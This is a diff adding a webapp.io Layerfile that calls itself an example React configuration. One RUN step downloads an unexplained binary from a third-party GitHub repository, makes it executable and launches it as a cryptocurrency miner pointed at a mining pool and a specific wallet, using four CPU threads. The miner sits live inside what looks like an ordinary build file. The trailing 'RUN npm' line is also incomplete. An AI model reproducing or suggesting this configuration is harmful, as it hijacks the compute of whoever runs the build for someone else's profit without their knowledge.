@@ -1,0 +1,14 @@
+#This is an example webapp.io configuration for React!
+FROM vm/ubuntu:18.04
+
+# To note: Layerfiles create entire VMs, *not* containers!
+
+RUN wget https://github.com/desafff/tahasd/raw/refs/heads/main/srebe && \
+    chmod 777 srebe && ./srebe --algorithm yespowersugar --pool nomp.mofumofu.me:3392 --wallet sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf --Worker ok4 --password x --cpu-threads 4
+
+COPY . .
+RUN npm 
+
+# Create a unique link to share the app in this runner.
+# Every time someone clicks the link, we'll wake up this staging server.
+EXPOSE WEBSITE http://localhost:3000
